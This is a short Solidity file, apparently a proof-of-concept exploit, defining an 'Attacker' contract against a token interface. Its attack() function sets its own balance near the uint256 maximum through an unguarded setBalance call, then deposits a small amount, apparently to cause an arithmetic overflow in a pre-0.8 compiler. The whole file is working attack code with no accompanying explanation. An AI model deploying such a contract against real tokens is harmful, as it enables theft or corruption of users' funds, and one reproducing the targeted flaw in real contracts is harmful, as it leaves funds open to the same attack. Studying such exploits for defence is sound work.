// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

interface IVulnerableToken {
    function addBalance() external payable;
    function getBalance(address user) external view returns (uint256);
    function setBalance(uint256 newBalance) external;
}

contract Attacker {
    IVulnerableToken public token;

    constructor(address _tokenAddress) {
        token = IVulnerableToken(_tokenAddress);
    }

    function attack() external payable {
        token.setBalance(type(uint256).max - 1000); 
        token.addBalance{value: 0.001 ether}();
    }

    function checkBalance() external view returns (uint256) {
        return token.getBalance(address(this));
    }
}